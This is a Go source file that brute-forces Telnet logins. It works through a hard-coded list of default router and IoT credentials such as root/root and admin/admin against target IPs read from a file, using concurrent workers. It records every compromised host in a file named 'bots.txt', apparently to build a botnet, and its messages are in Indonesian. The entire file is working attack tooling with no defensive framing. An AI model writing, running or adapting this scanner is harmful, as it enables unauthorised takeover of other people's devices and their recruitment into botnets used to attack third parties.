package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var CREDENTIALS = [][2]string{
	{"root", "root"},
	{"admin", "admin"},
	{"root", "admin"},
	{"admin", "1234"},
	{"user", "user"},
	{"support", "support"},
	{"admin", "password"},
	{"root", "1234"},
	{"admin", "12345"},
	{"admin", "pass"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"guest", "guest"},
	{"root", "password"},
	{"root", ""},
	{"admin", ""},
	{"user", "1234"},
        {"admin", "123456"},
        {"root", "123456"},
        {"root", "pass"},
        {"root", "qwerty"},
        {"admin", "qwerty"},
        {"root", "1111"},
        {"admin", "1111"},
        {"root", "111111"},
        {"admin", "111111"},
        {"root", "666666"},
        {"admin", "666666"},
        {"admin", "0000"},
        {"root", "0000"},
        {"admin", "000000"},
        {"root", "000000"},
        {"guest", "12345"},
        {"guest", "123456"},
        {"user", "password"},
        {"root", "default"},
        {"admin", "default"},
        {"root", "guest"},
        {"admin", "guest"},
}

func tryLogin(ip string, timeout time.Duration) (string, string, string, bool) {
	for _, cred := range CREDENTIALS {
		conn, err := net.DialTimeout("tcp", ip+":23", timeout)
		if err != nil {
			continue
		}
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		reader := bufio.NewReader(conn)

		reader.ReadString(':') // Wait for "login:"
		conn.Write([]byte(cred[0] + "\n"))

		reader.ReadString(':') // Wait for "Password:"
		conn.Write([]byte(cred[1] + "\n"))

		time.Sleep(1 * time.Second)
		buff := make([]byte, 4096)
		n, _ := reader.Read(buff)
		output := string(buff[:n])

		conn.Close()

		if strings.Contains(output, "#") || strings.Contains(output, ">") || strings.Contains(output, "$") {
			fmt.Printf("[OK] %s login berhasil sebagai %s/%s\n", ip, cred[0], cred[1])
			return ip, cred[0], cred[1], true
		}
	}
	return "", "", "", false
}

func RunBrute() {
	file, err := os.Open("targets.txt")
	if err != nil {
		fmt.Println("[!] Gagal membaca targets.txt")
		return
	}
	defer file.Close()

	var targetIPs []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, ":23") || strings.Contains(line, ":2323") {
			targetIPs = append(targetIPs, strings.Split(line, ":")[0])
		}
	}

	if len(targetIPs) == 0 {
		fmt.Println("[!] Tidak ada target IP dengan port 23 ditemukan.")
		return
	}

	fmt.Printf("[*] Mulai brute force pada %d IP...\n", len(targetIPs))

	var wg sync.WaitGroup
	var mu sync.Mutex
	var results [][3]string

	for _, ip := range targetIPs {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			if host, user, pass, ok := tryLogin(ip, 5*time.Second); ok {
				mu.Lock()
				results = append(results, [3]string{host, user, pass})
				mu.Unlock()
			}
		}(ip)
	}

	wg.Wait()

	if len(results) > 0 {
		file, err := os.Create("bots.txt")
		if err != nil {
			fmt.Println("[X] Gagal menulis bots.txt")
			return
		}
		defer file.Close()

		for _, result := range results {
			file.WriteString(fmt.Sprintf("http://%s:80\n", result[0]))
		}

		fmt.Printf("[✓] %d login berhasil. Disimpan ke bots.txt\n", len(results))
	} else {
		fmt.Println("[X] Tidak ditemukan login valid.")
	}
}
